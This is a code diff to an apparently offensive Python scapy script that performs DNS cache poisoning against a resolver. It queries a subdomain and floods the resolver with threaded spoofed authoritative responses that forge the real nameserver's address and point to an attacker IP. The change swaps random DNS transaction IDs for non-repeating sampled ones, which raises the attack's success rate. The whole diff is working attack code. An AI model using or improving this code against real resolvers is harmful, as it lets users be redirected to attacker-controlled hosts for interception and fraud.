@@ -5,12 +5,12 @@ import threading
 from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1
 
 # --- Worker function for sending a single spoofed packet ---
-def send_spoofed_response(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain):
+def send_spoofed_response(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain, txn_id):
     """Crafts and sends one spoofed DNS response packet for a specific subdomain."""
     spoofed_response = IP(src=real_ns_ip, dst=resolver_ip) / \
                        UDP(sport=53, dport=5000) / \
                        DNS(
-                           id=random.randint(1, 65535),
+                           id=txn_id,
                            qr=1, aa=1,
                            qd=DNSQR(qname=specific_subdomain),  # Use the specific subdomain
                            an=DNSRR(rrname=specific_subdomain, ttl=86400, rdata=attacker_ip),  # Use the specific subdomain
@@ -31,14 +31,16 @@ def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests
         query_packet = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=specific_subdomain))
         send(query_packet, verbose=0)
 
+        txn_ids = random.sample(range(1, 65536), num_responses) 
+
         # --- Multithreaded Flood ---
         print(f"[*]   Flooding with {num_responses} spoofed responses using threads...")
         threads = []
-        for _ in range(num_responses):
+        for txn_id in txn_ids:
             # Create a thread for each packet
             thread = threading.Thread(
                 target=send_spoofed_response,
-                args=(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain)
+                args=(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain, txn_id)
             )
             threads.append(thread)
             thread.start()
